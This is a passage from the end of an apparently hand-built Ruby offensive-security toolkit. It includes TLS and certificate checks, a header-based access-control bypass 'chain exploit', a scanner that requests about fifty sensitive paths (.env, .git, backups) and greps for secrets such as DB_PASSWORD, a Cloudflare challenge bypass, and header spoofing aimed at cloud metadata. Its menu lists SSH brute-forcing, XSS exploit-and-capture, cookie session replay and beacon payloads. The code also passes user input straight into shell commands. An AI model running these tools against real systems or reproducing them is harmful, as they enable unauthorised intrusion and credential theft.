  return puts("#{BRIGHT_RED}[!] Invalid domain provided.#{RESET}") if domain.empty?

  puts "\n#{BRIGHT_YELLOW}[*] Running: openssl s_client -connect #{domain}:443 -servername #{domain} -status#{RESET}"
  puts "#{BRIGHT_GREEN}=== Press Ctrl+C to stop once you're done viewing the debug output ===#{RESET}"

  cmd = "openssl s_client -connect #{domain}:443 -servername #{domain} -status"
  system(cmd)

  puts "\n#{BRIGHT_CYAN}[i] TLS inspection finished for #{domain}#{RESET}"
end
# === Function 57: Cert Transparency Subdomain Leaker ===
def cert_san_subdomain_finder
  section_header("57) Cert SAN Subdomain Finder")

  print "#{BRIGHT_CYAN}Enter target domain (e.g., example.com): #{RESET}"
  domain = gets.chomp.strip

  puts "\n#{BRIGHT_GREEN}[*] Extracting SAN subdomains from certificate...#{RESET}"

  begin
    output = `echo | openssl s_client -connect #{domain}:443 -servername #{domain} 2>/dev/null | openssl x509 -noout -text`

    if output.empty?
      puts "#{BRIGHT_RED}[!] No certificate data retrieved. Ensure the domain is reachable.#{RESET}"
      return
    end

    sans = output.scan(/DNS:([a-zA-Z0-9\.\-\*]+)/).flatten.uniq

    if sans.empty?
      puts "#{BRIGHT_YELLOW}[!] No SAN entries found in the certificate.#{RESET}"
    else
      puts "#{BRIGHT_GREEN}[+] Found SAN entries:#{RESET}"
      sans.each { |sub| puts "  • #{sub}" }
    end
  rescue => e
    puts "#{BRIGHT_RED}[!] OpenSSL error: #{e.message}#{RESET}"
  end
end
# === Function 58: TLS Weak Cipher/Protocol Checker ===
def tls_weakness_checker
  section_header("58) TLS Weak Cipher/Protocol Checker")

  print "#{BRIGHT_CYAN}Enter target domain (e.g., example.com): #{RESET}"
  domain = gets.chomp.strip

  puts "\n#{BRIGHT_GREEN}[*] Connecting to #{domain} and extracting TLS session info...#{RESET}"

  output = `echo | openssl s_client -connect #{domain}:443 -servername #{domain} 2>/dev/null`

  weak_patterns = {
    /TLSv1(?!\.2)/ => "Outdated TLSv1",
    /TLSv1\.1/ => "Outdated TLSv1.1",
    /SSLv2/ => "SSLv2 Detected",
    /SSLv3/ => "SSLv3 Detected",
    /RC4/ => "RC4 Cipher Used",
    /DES/ => "DES Cipher Used",
    /NULL/ => "NULL Cipher Detected (no encryption)",
    /MD5/ => "MD5 Cipher Detected",
    /EXPORT/ => "Export-Grade Cipher Detected"
  }

  issues_found = false
  weak_patterns.each do |regex, message|
    if output.match?(regex)
      puts "#{BRIGHT_RED}[!] Weakness Detected: #{message}#{RESET}"
      issues_found = true
    end
  end

  unless issues_found
    puts "#{BRIGHT_GREEN}[✓] No weak ciphers or deprecated protocols found.#{RESET}"
  end
end
# === Function 59: Cert Expiry & OCSP Health ===
def cert_expiry_and_ocsp_checker
  section_header("59) Certificate Expiry & OCSP Checker")

  print "#{BRIGHT_CYAN}Enter target domain (e.g., example.com): #{RESET}"
  domain = gets.chomp.strip

  output = `echo | openssl s_client -connect #{domain}:443 -servername #{domain} 2>/dev/null`

  not_after_line = output.lines.find { |line| line.match?(/Not ?After/) }
  expiry_date = not_after_line&.split(": ", 2)&.last&.strip rescue nil

  if expiry_date
    expiry = Time.parse(expiry_date) rescue nil
    if expiry
      remaining_days = ((expiry - Time.now) / (60 * 60 * 24)).to_i
      puts "#{BRIGHT_GREEN}[+] Certificate Expires: #{expiry} (in #{remaining_days} days)#{RESET}"
      puts "#{BRIGHT_YELLOW}[!] Certificate is expiring soon!#{RESET}" if remaining_days < 30
    else
      puts "#{BRIGHT_RED}[!] Failed to parse expiry time.#{RESET}"
    end
  else
    puts "#{BRIGHT_RED}[!] Could not locate Not After field in cert.#{RESET}"
  end

  if output.include?("OCSP response: no response sent")
    puts "#{BRIGHT_YELLOW}[!] OCSP Stapling Disabled — No revocation check available.#{RESET}"
  elsif output.include?("OCSP Response Status: successful")
    puts "#{BRIGHT_GREEN}[+] OCSP Response Present and Valid.#{RESET}"
  end

  if output.include?("Verify return code: 0 (ok)")
    puts "#{BRIGHT_GREEN}[✓] Certificate Verified Successfully.#{RESET}"
  else
    puts "#{BRIGHT_RED}[!] Certificate Verification Failed or Incomplete.#{RESET}"
  end
end
# === Function 60: Chain Exploit Tester (PoC Mode) ===
def chain_exploit_tester
  section_header("60) Chained Exploit Proof-of-Concept Tester")

  print "#{BRIGHT_CYAN}Enter target domain (e.g., example.com): #{RESET}"
  target = gets.chomp.strip

  timestamp = Time.now.strftime("%Y-%m-%dT%H-%M-%S")
  sanitized_target = target.gsub(/\W/, '_')
  log_file_path = "chain_exploit_#{sanitized_target}_#{timestamp}.log"

  puts "#{BRIGHT_MAGENTA}[*] Running chained exploit simulation against #{target}...#{RESET}"

  curl_commands = [
    "curl -i -H \"X-Original-URL: /.env\" https://#{target}",
    "curl -i -H \"X-Original-URL: /admin/.git/config\" https://#{target}",
    "curl -i https://#{target}/.git/config",
    "curl -i -H \"X-Forwarded-Host: localhost\" -H \"X-Forwarded-For: 127.0.0.1\" https://#{target}",
    "openssl s_client -connect #{target}:443 -servername #{target} -status"
  ]

  begin
    File.open(log_file_path, 'w') do |log|
      log.puts "[*] Chain Exploit Log for #{target} @ #{timestamp}"
      curl_commands.each do |cmd|
        log.puts "\n[Command] #{cmd}"
        output = `#{cmd} 2>&1`
        log.puts output
      end
    end
    puts "#{BRIGHT_GREEN}[+] Results saved to #{log_file_path}#{RESET}"
  rescue => e
    puts "#{BRIGHT_RED}[!] Failed to execute chain test: #{e.message}#{RESET}"
  end
end
# === Function 61: Server-Side Leak Sniffer ===
def server_leak_sniffer
  section_header("61) Server-Side Leak Sniffer")

  print "#{BRIGHT_CYAN}Enter target domain (e.g., example.com): #{RESET}"
  target = gets.chomp.strip

  sensitive_paths = [
    "/.env", "/debug", "/config.json", "/.git/config", "/admin/.env",
    "/storage/logs/laravel.log", "/api/debug", "/server-status", "/.git/index",
    "/config.php", "/config.yml", "/config/.env", "/.env.local", "/.env.dev",
    "/.env.prod", "/.env.example", "/.git/HEAD", "/.gitignore", "/.svn/entries",
    "/.htaccess", "/.htpasswd", "/backup.zip", "/backup.tar.gz", "/db.sqlite",
    "/database.sql", "/database.db", "/phpinfo.php", "/admin/config", "/admin/debug",
    "/admin/logs", "/admin/.htaccess", "/debug.php", "/logs/error.log",
    "/logs/debug.log", "/logs/access.log", "/var/log/syslog", "/var/log/messages",
    "/cgi-bin/test.cgi", "/cgi-bin/php.cgi", "/cgi-bin/.env", "/test/.env",
    "/test/debug", "/api/.env", "/api/config", "/api/logs", "/staging/.env",
    "/staging/debug", "/local.env", "/local/.env", "/settings.py", "/web.config"
  ]

  patterns = /(APP_KEY=|DB_PASSWORD=|access_token|root:|Exception|Fatal error|X-DEBUG)/

  puts "\n#{BRIGHT_YELLOW}Scanning #{sensitive_paths.size} sensitive paths on #{target}...#{RESET}"

  sensitive_paths.each do |path|
    full_url = "https://#{target}#{path}"
    response = `curl --silent --insecure -i #{full_url}`

    if response =~ patterns
      puts "#{BRIGHT_RED}[!!!] POTENTIAL LEAK DETECTED:#{RESET} #{full_url}"
      response.lines.each do |line|
        puts "   #{line.strip}" if line =~ patterns
      end
    elsif response.include?("200 OK")
      puts "#{BRIGHT_GREEN}[+] Accessible (no obvious leak):#{RESET} #{full_url}"
    elsif response.include?("403 Forbidden")
      puts "#{YELLOW}[i] Forbidden (403):#{RESET} #{full_url}"
    else
      puts "#{BRIGHT_BLUE}[-] Not accessible or safe:#{RESET} #{full_url}"
    end
  end

rescue => e
  log_error("server_leak_sniffer", e)
end
# ------------------------------------------------------------------------
# Function 62: Cloudflare JavaScript Challenge Detector & Bypass Attempt
def cloudflare_js_bypass_checker
  section_header("62) Cloudflare JS Challenge Detector & Bypass Attempt")

  print "#{BRIGHT_CYAN}Enter target domain (e.g., example.com): #{RESET}"
  target = gets.chomp.strip
  return puts "#{RED}[!] Invalid domain.#{RESET}" if target.empty?

  url = "https://#{target}/"
  challenge_detected = false
  bypass_attempted = false

  begin
    puts "#{YELLOW}[*] Checking standard response from Cloudflare-protected page...#{RESET}"
    response = `curl --silent --location #{url}`
    
    if response =~ /(cf-browser-verification|jschl_vc|jschl_answer|Just a moment)/
      challenge_detected = true
      puts "#{BRIGHT_RED}[!] Cloudflare JS challenge detected!#{RESET}"
    else
      puts "#{BRIGHT_GREEN}[+] No JS challenge detected — normal access confirmed.#{RESET}"
    end

    if challenge_detected
      puts "#{YELLOW}[*] Attempting browser-simulated bypass with user-agent and headers...#{RESET}"

      user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "\
                   "(KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"

      bypass_response = `curl --silent --location --compressed \
        -A "#{user_agent}" \
        -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" \
        -H "Accept-Language: en-US,en;q=0.5" \
        -H "Connection: keep-alive" \
        -H "Upgrade-Insecure-Requests: 1" \
        #{url}`

      if bypass_response =~ /(cf-browser-verification|jschl_vc|jschl_answer|Just a moment)/
        puts "#{BRIGHT_RED}[-] Bypass failed — still facing JS challenge.#{RESET}"
      else
        puts "#{BRIGHT_GREEN}[+] Bypass succeeded — JS challenge mitigated!#{RESET}"
        bypass_attempted = true
      end
    end

    # Save log
    log_name = "cloudflare_bypass_#{target.gsub(/[^a-zA-Z0-9]/, '_')}_#{Time.now.strftime('%Y-%m-%d_%H-%M-%S')}.log"
    File.open(log_name, "w") do |f|
      f.puts "[*] Cloudflare JS Challenge Detection"
      f.puts "Target: #{target}"
      f.puts "Detected Challenge: #{challenge_detected}"
      f.puts "Bypass Attempted: #{bypass_attempted}"
      f.puts "Timestamp: #{Time.now}"
    end
    puts "#{BLUE}[i] Log written to #{log_name}#{RESET}"

  rescue => e
    log_error("cloudflare_js_bypass_checker", e)
  end
end
#----------------------------------------------------------------------------------------------------------------------------------------
# Function 63: chained_tls_header_bypass_tester
def chained_tls_header_bypass_tester
  print "#{BRIGHT_CYAN}Enter target domain (e.g., example.com): #{RESET}"
  target = gets.chomp.strip

  timestamp = Time.now.strftime("%Y-%m-%dT%H-%M-%S%z")
  log_file = "tls_header_chain_#{target.gsub(/\W/, '_')}_#{timestamp}.log"

  puts "#{BRIGHT_MAGENTA}=== Chained TLS + Header Bypass Tester for #{target} ===#{RESET}"

  bypass_headers = [
    { "X-Forwarded-Host" => "admin.#{target}", "X-Original-URL" => "/admin" },
    { "X-Forwarded-For" => "127.0.0.1", "X-Real-IP" => "127.0.0.1" },
    { "X-Original-URL" => "/.env" },
    { "Referer" => "https://admin.#{target}/login" },
    { "X-Forwarded-Host" => "localhost", "X-Original-URL" => "/config.json" },
    { "X-Forwarded-For" => "169.254.169.254" },
    { "X-Forwarded-Host" => "evil.#{target}", "X-Original-URL" => "/.git/config" }
  ]

  File.open(log_file, "w") do |f|
    f.puts "=== Chained TLS + Header Bypass Tester ==="
    f.puts "Target: #{target}"
    f.puts "Timestamp: #{timestamp}\n\n"

    puts "#{BRIGHT_YELLOW}[*] Fetching TLS Certificate for #{target}...#{RESET}"
    tls_output = `openssl s_client -connect #{target}:443 -servername #{target} -showcerts -status 2>&1`
    f.puts "--- TLS Metadata ---\n"
    f.puts tls_output
    f.puts "\n--- HTTP Header Bypass Tests ---\n"

    bypass_headers.each_with_index do |headers, i|
      header_string = headers.map { |k, v| %Q(-H "#{k}: #{v}") }.join(" ")
      test_cmd = "curl --ssl-no-revoke -i #{header_string} https://#{target} --max-time 10 2>&1"
      puts "#{BRIGHT_BLUE}[#{i+1}] Testing headers: #{headers}#{RESET}"

      result = `#{test_cmd}`
      f.puts "\n[#{"%02d" % (i+1)}] Headers: #{headers}"
      f.puts result
    end

    puts "#{BRIGHT_GREEN}[✓] TLS and header bypass chain test completed.#{RESET}"
    puts "#{BRIGHT_CYAN}[i] Results saved to #{log_file}#{RESET}"
  end
rescue => e
  log_error("chained_tls_header_bypass_tester", e)
end
#----------------------------------------------------------------------------------------------------------------------------------------
def run_tool
  loop do
    display_menu
    option = gets.chomp.to_i
  begin
    case option
    when 1
      display_network_configuration
    when 2
      ping_address
    when 3
      monitor_open_ports
    when 4
      scan_local_network
    when 5
      basic_vulnerability_check
    when 6
      service_fingerprint_summary
    when 7 
      port_scanning_with_service_detection
    when 8
      ssh_brute_force
    when 9
      web_vulnerability_scanner
    when 10
      sql_injection_test
    when 11
      directory_bruteforcer_sensitive 
    when 12
      xss_scanner 
    when 13
      https_analysis 
    when 14
      osint_email_breach_lookup 
    when 15
      telegram_bot_alerts
    when 16
      arp_scanning
    when 17
      detect_arp_spoofing
    when 18
      puts "#{BRIGHT_RED}Exiting the tool...#{RESET}"
      break
    when 19
      ct_subdomain_origin_discovery
    when 20
      dns_zone_transfer_tester
    when 21
      cors_scanner
    when 22
      open_redirect_scanner
    when 23
      automated_api_setup
    when 24
      chatgpt_assistant
    when 25
      domain_info_gather
    when 26
      xss_exploit_and_capture
    when 27
      replay_cookie_session
    when 28
      session_verify_and_device_info
    when 29
      network_info_during_session
    when 30
      analyze_cookie_file
    when 31
      check_wp_cookies
    when 32
      wp_admin_replay_and_verify
    when 33
      start_beacon_server
    when 34
      generate_xss_beacon_payload
    when 35
      show_beacon_logs
    when 36
      absolute_path_traversal_test
    when 37
      storage_enumerator
    when 38
         batch_scan
    when 39
        dns_bruteforce_subdomains
    when 40
        subdomain_takeover_scan
    when 41
        s3_bucket_enum
    when 42
        jwt_decode
    when 43
        aes_cbc_decrypt
    when 44
        nmap_nse_vuln_scan
    when 45
        https_handshake_debug
    when 46
        nginx_status_check
    when 47
        webdav_method_probe
    when 48
        nginx_version_fingerprint
    when 49
        print "#{BRIGHT_CYAN}Enter target host (e.g., example.com): #{RESET}"
        target = gets.chomp.strip
        if target.empty?
          puts "#{BRIGHT_RED}[!] Target host cannot be empty.#{RESET}"
        else
          analyze_target_tls_and_headers(target)
        end
    when 50
      print "Enter target host (e.g., example.com): "
      target = gets.chomp.strip
      cloudfront_misconfig_scan(target)
    when 51
      print "Enter base domain (e.g., example.com): "
      domain = gets.chomp.strip
      subdomain_takeover_scan(domain)
    when 52
      cname_takeover_verifier
    when 53
      idor_parameter_tester_v2
    when 54
      host_header_injection_tester_v2
    when 55
      sensitive_file_prober
    when 56
      tls_debug_inspector
    when 57
      cert_san_subdomain_finder
    when 58
      tls_weakness_checker
    when 59
      cert_expiry_and_ocsp_checker
    when 60
      chain_exploit_tester
    when 61
      server_leak_sniffer
    when 62
      cloudflare_js_bypass_checker
    when 63
      chained_tls_header_bypass_tester
  else
    puts "#{BRIGHT_YELLOW}Option not yet implemented or invalid.#{RESET}"
  end
  rescue StandardError => e
    log_error("run_tool - Option #{option}", e)
  end
end
end

# Start the tool
run_tool
